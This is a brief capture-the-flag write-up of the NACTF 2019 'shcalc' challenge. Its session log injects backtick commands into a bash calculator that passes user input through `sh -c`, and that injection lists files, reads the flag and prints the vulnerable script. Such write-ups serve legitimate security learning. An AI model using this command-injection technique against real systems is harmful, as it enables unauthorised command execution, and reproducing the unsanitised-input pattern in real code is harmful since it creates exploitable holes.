```
John's written a handy calculator app - in bash! Too bad it's not that secure...

Connect at nc shell.2019.nactf.com 31214

Hint : Heard of injection ? 

maybe a BASH injection ? 
```

``` 

> `ls`
sh: 1: arithmetic expression: expecting EOF: "calc.sh
flag.txt"
> 'cat calc.sh`
sh: 1: Syntax error: EOF in backquote substitution
> `cat flag.txt'`
sh: 1: Syntax error: Unterminated quoted string
> `cat flag.txt`
sh: 1: arithmetic expression: expecting EOF: "nactf{3v4l_1s_3v1l_dCf80yOo}"
> `cat clac.sh`
cat: clac.sh: No such file or directory
sh: 1: arithmetic expression: expecting primary: ""
> `cat calc.sh`
sh: 1: arithmetic expression: expecting primary: "#!/bin/sh

cat <<EOF
shcalc v1.1
EOF

echo -n '> '
while read input; do
	env -i sh -c "echo \$(($input))"
	echo -n '> '
done
echo HACKED"
```
